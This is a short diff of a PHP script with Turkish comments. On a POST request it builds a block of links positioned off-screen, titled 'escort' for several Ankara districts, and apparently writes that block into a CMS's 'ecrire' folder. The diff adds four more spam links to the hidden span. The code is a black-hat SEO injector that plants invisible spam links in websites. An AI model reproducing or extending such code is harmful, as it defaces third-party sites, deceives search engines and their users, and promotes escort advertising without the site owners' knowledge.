@@ -4,6 +4,10 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Eklenecek backlink kodu
     $backlinkCode = '<span style="position: absolute; left: -9655px;"><a href="http://banor.net/" title="ankara escort">ankara escort</a>
+<a href="http://eryamansu.com/" title="eryaman escort">eryaman escort</a>
+<a href="http://sincansaglik.com/" title="sincan escort">sincan escort</a>
+<a href="http://cankayalar.com/" title="çankaya escort">çankaya escort</a>
+<a href="http://etlikcivciv.com/" title="etlik escort">etlik escort</a>
 </span>' . PHP_EOL;
 
     // Ecrire klasörünün yolu
